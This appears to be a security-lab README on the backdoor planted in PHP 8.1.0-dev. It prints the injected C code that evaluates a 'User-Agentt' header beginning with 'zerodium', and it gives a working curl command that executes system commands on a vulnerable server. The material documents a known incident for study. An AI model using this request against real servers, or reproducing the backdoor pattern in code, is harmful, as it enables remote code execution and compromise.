# PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution

## Requirements

 - The server needs to run on a specific backdoored version of PHP (PHP-8.1.0-dev)

## Introduction

A compromised git account pushed code to the PHP source repository introducing a backdoor in commit [c730aa26bd52829a49f2ad284b181b7e82a68d7d](https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d):

```c
{
    zval zoh;
    php_output_handler *h;
    zval *enc;

    if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL("_SERVER"))) &&
        (enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), "HTTP_USER_AGENTT", sizeof("HTTP_USER_AGENTT") - 1))) {
        convert_to_string(enc);
        if (strstr(Z_STRVAL_P(enc), "zerodium")) {
            zend_try {
                zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
            } zend_end_try();
        }
    }
}
```

This code evaluates a string contained in the `User-Agentt` header if this string starts with `zerodium`.

## Exploitation

You can execute PHP code (prefixed by the string `zerodium`) on the remote machine through the `User-Agentt` header:

```sh
curl -H 'Accept-Encoding: deflate' -H "User-Agentt: zerodiumsystem('id');" 'http://127.0.0.1:10080/dummy.php'
```

## References
 - https://flast101.github.io/php-8.1.0-dev-backdoor-rce/
 - https://news-web.php.net/php.internals/113838
